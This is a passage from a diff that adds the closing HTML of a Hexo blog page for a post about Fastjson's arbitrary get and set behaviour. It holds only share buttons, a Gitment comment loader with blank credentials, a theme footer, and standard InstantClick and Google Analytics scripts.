+        <div>
+            <span class="dark">F4miti0n&#39;s Blog</span>
+            <span></span>
+        </div>
+        </a>
+        <section id="sharing">
+            <a title="Share to Twitter" class="twitter" target="_blank" rel="noopener" href="https://twitter.com/intent/tweet?text=http://example.com/2023/05/21/Fastjson%E3%81%AE%E4%BB%BB%E6%84%8Fget%E4%B8%8Eset/ - Fastjsonの任意get与set @"><span class="icon-twitter">tweet</span></a>
+            <a title="Share to Facebook" class="facebook" href="#" onclick="
+                window.open(
+                  'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+                  'facebook-share-dialog',
+                  'width=626,height=436');
+                return false;"><span class="icon-facebook-sign">Share</span>
+            </a>
+        </section>
+    </footer>
+
+
+  <section id="comment">
+    <button class="btn" id="loadcmts" onclick="cmts.load();">Load Comments</button>
+    <div id="gitment"></div>
+    <script src='/js/gitment.browser.js'></script>
+    <link rel="stylesheet" href=''>
+    <script>
+      var cmts={
+        load:function cmts(){
+          var gitment = new Gitment({
+          
+            id: "Fastjsonの任意get与set",
+          
+            owner: "",
+            repo: "",
+            oauth: {
+              client_id: "",
+              client_secret: "",
+            },
+          })
+          gitment.render('gitment');
+          var loadcmt = document.getElementById("loadcmts");
+          var imyourfather = loadcmt.parentNode;
+          imyourfather.removeChild(loadcmts)
+        }
+      }
+    </script>
+  </section>
+
+
+	<footer id="footer">
+	<div id="social">
+		<p class="small">©  F4miti0n| Powered by Hexo & 
+			<a target="_blank" rel="noopener" href="https://github.com/F0r3at/Lights"> Lights</a>
+		</p>
+	</div>
+</footer>
+
+</section>
+
+	<script src="//cdnjs.loli.net/ajax/libs/instantclick/3.0.1/instantclick.min.js" data-no-instant></script>
+	<script data-no-instant>
+		
+			(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+			(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+			m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+			})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+			ga('create', 'UA-XXXXXXXX-Y', 'auto');
+			ga('send', 'pageview');
+  			InstantClick.on('change', function() {
+  				ga('send', 'pageview', location.pathname + location.search);
+			});
+		
+		InstantClick.init('mousedown');
+	</script>
+
+
+
